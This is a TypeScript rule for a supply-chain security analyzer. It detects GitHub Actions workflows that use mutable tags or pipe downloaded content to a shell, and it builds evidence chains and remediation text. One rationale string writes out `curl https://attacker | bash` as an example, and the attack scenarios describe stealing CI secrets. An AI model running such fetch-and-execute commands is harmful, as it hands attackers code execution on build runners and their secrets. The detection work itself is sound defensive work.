/**
 * L1 — GitHub Actions Tag Poisoning (Rule Standard v2).
 *
 * REPLACES the L1 (ActionsTagPoisoningRule) class in
 * `packages/analyzer/src/rules/implementations/advanced-supply-chain-detector.ts`.
 *
 * Detection is PURELY structural: every workflow file is parsed as YAML
 * via the `yaml` npm package, `jobs.<id>.steps[i].uses` / `.run` are
 * walked, and each offending key becomes a `config`-kind Location. No
 * regex literals anywhere outside `data/`.
 */

import type { AnalysisContext } from "../../../engine.js";
import {
  type TypedRuleV2,
  type RuleResult,
  type RuleRequirements,
  type AnalysisTechnique,
  registerTypedRuleV2,
} from "../../base.js";
import { EvidenceChainBuilder, type EvidenceChain } from "../../../evidence.js";
import { gatherL1, type L1Fact } from "./gather.js";
import {
  stepInspectOffendingKey,
  stepCheckSignedCommit,
  stepInspectMitigation,
} from "./verification.js";

const RULE_ID = "L1";
const RULE_NAME = "GitHub Actions Tag Poisoning";
const OWASP = "MCP10-supply-chain" as const;
const MITRE = "AML.T0017" as const;
const CONFIDENCE_CAP = 0.9;

const REMEDIATION =
  "Pin every `uses:` reference to a full 40-character commit SHA, not a " +
  "mutable tag (v1, main, latest). Automate pin updates with Dependabot's " +
  "`commit-message: pin-dependencies` configuration or Renovate's " +
  "`extends: ['pin-dependencies']`. Add a step-security/harden-runner step " +
  "as the first step of every job that touches secrets (publishes to npm, " +
  "reads DATABASE_URL, etc.). For `run:` steps, never pipe downloaded " +
  "content to bash/sh — download, verify a pinned SHA-256 checksum, then " +
  "execute. Enable tag-protection on the repository's own release tags via " +
  "Settings → Rules → Tag ruleset so downstream consumers can in turn pin " +
  "safely.";

class GitHubActionsTagPoisoningRule implements TypedRuleV2 {
  readonly id = RULE_ID;
  readonly name = RULE_NAME;
  readonly requires: RuleRequirements = { source_code: true };
  readonly technique: AnalysisTechnique = "structural";

  analyze(context: AnalysisContext): RuleResult[] {
    const gathered = gatherL1(context);
    if (gathered.mode !== "facts") return [];
    return gathered.facts.map((f) => this.buildFinding(f));
  }

  private buildFinding(fact: L1Fact): RuleResult {
    const builder = new EvidenceChainBuilder()
      .source({
        source_type: "external-content",
        location: fact.location,
        observed: fact.observed.slice(0, 200),
        rationale:
          fact.family === "pipe-to-shell-in-run"
            ? `The workflow step downloads remote content and pipes it to a ` +
              `shell interpreter. The remote server is external content that ` +
              `the repository owner does not control; any response byte ` +
              `reaches the runner's bash process.`
            : `The workflow pins to a ref that is not a 40-character commit ` +
              `SHA. The upstream Action repository can force-push the tag to ` +
              `any commit at any time; CVE-2025-30066 (tj-actions/changed-files, ` +
              `March 2025) demonstrated this attack against ~23,000 ` +
              `downstream repositories.`,
      })
      .sink({
        sink_type: "command-execution",
        location: fact.location,
        observed:
          fact.family === "pipe-to-shell-in-run"
            ? `Runner executes \`${truncate(fact.observed, 160)}\` via the shell`
            : `Runner fetches and executes Action \`${fact.usesRef?.owner}/${fact.usesRef?.repo}@${fact.usesRef?.ref}\``,
        cve_precedent: "CVE-2025-30066",
      })
      .mitigation({
        mitigation_type: "sandbox",
        present: fact.hardenRunnerPresent,
        location: fact.location,
        detail: fact.hardenRunnerPresent
          ? "step-security/harden-runner is present in the workflow. This " +
            "provides runtime egress filtering but does not prevent the " +
            "Action from reading secrets — pin to SHA regardless."
          : "No step-security/harden-runner step detected. The runner has " +
            "unrestricted network and filesystem access when the referenced " +
            "Action executes.",
      })
      .impact({
        impact_type: "remote-code-execution",
        scope: "server-host",
        exploitability:
          fact.family === "pipe-to-shell-in-run" || !fact.firstParty
            ? "trivial"
            : "moderate",
        scenario:
          fact.family === "pipe-to-shell-in-run"
            ? `An attacker who MITMs the download URL (weak CDN, DNS " +
              "hijack, compromised redirector) injects arbitrary shell ` +
              `commands. These execute with the runner's secrets in ` +
              `environment variables — NPM_TOKEN, GITHUB_TOKEN, AWS_* — ` +
              `enabling package publish-key theft and downstream supply-` +
              `chain compromise identical to CVE-2025-30066.`
            : `The upstream repository owner (or an account compromise) ` +
              `force-pushes \`${fact.usesRef?.owner}/${fact.usesRef?.repo}\` ` +
              `tag \`${fact.usesRef?.ref}\` to a malicious commit. Every ` +
              `workflow run after the force-push executes the new code with ` +
              `full access to this repository's secrets. The scope covers ` +
              `every downstream MCP server that depends on our published ` +
              `package.`,
      })
      .factor(
        "mutable_tag_reference",
        fact.family === "expression-interpolated" ? 0.2 : 0.15,
        fact.family === "expression-interpolated"
          ? `Ref is computed from a workflow expression (\`${fact.observed}\`). ` +
            `The effective value is only knowable at runtime — static review ` +
            `cannot verify what runs. Treated as the highest-risk unpinned form.`
          : `Ref classification: ${fact.family}. ${fact.description}.`,
      )
      .factor(
        "unpinned_third_party_action",
        fact.firstParty ? -0.05 : 0.08,
        fact.firstParty
          ? `Action owner is \`${fact.usesRef?.owner ?? "<unknown>"}\` — a ` +
            `first-party GitHub owner with strong tag-protection maturity. ` +
            `Risk is still non-zero (CVE-2025-30066 hit a well-known ` +
            `Marketplace publisher) but the factor is slightly negative.`
          : `Action owner \`${fact.usesRef?.owner ?? "<unknown>"}\` is ` +
            `third-party — the strongest increase to confidence because ` +
            `third-party tag protection varies widely.`,
      )
      .factor(
        "pipe_to_shell_in_run",
        fact.family === "pipe-to-shell-in-run" ? 0.15 : 0,
        fact.family === "pipe-to-shell-in-run"
          ? `The \`run:\` body matches the pipe-to-shell primitive: ` +
            `a download tool feeds its output directly into \`| bash\`/\`| sh\`. ` +
            `Equivalent to \`curl https://attacker | bash\` on the runner.`
          : `Not a run-step finding — factor recorded at 0 for completeness.`,
      )
      .reference({
        id: "CVE-2025-30066",
        title: "tj-actions/changed-files — tag poisoning via force-push",
        url: "https://nvd.nist.gov/vuln/detail/CVE-2025-30066",
        relevance:
          "Canonical tag-poisoning incident. Upstream Action maintainer " +
          "account was compromised; the v35 tag was force-pushed to a " +
          "malicious commit; ~23,000 downstream workflows exfiltrated " +
          "secrets on the next CI run.",
      })
      .verification(stepInspectOffendingKey(fact))
      .verification(stepCheckSignedCommit(fact))
      .verification(stepInspectMitigation(fact));

    const chain = capChainConfidence(builder.build(), CONFIDENCE_CAP);

    return {
      rule_id: RULE_ID,
      severity: "critical",
      owasp_category: OWASP,
      mitre_technique: MITRE,
      remediation: REMEDIATION,
      chain,
    };
  }
}

function capChainConfidence(chain: EvidenceChain, cap: number): EvidenceChain {
  if (chain.confidence <= cap) return chain;
  chain.confidence_factors.push({
    factor: "charter_confidence_cap",
    adjustment: cap - chain.confidence,
    rationale:
      `L1 charter caps confidence at ${cap}. Two scenarios keep the cap ` +
      `below 1.0: (a) the workflow file may never actually execute — ` +
      `stale repositories can contain abandoned workflow files the static ` +
      `analyser cannot prove unreachable; (b) enterprise repositories may ` +
      `have server-side tag-protection rules, which the static analyser ` +
      `has no way to observe.`,
  });
  chain.confidence = cap;
  return chain;
}

function truncate(s: string, max: number): string {
  return s.length <= max ? s : `${s.slice(0, max - 1)}…`;
}

registerTypedRuleV2(new GitHubActionsTagPoisoningRule());

export { GitHubActionsTagPoisoningRule };
